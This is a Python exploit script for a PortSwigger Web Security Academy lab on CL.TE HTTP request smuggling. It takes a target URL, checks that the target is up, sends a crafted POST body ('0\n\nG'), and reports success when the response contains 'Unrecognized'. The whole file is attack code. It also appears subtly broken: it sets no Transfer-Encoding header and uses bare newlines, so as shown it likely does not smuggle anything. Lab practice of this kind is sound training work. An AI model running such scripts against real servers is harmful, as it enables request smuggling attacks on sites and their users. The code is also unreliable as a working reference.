import requests
import argparse

# https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: request-smuggling-01.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

payload = args.target
payload_data = "0\n\nG"
print('[*] Payload created')

r = requests.post(payload, data=payload_data)
print("[*] Sending payload...you might need to try this one a few times")
if r.status_code == 403:
    completion_text = b'Unrecognized'
    if completion_text in r.content:
        print('[*] Success')
    else:
        print('[!] Exploit failed')
        exit(0)
else:
    print('[!] Exploit failed')
    exit(0)
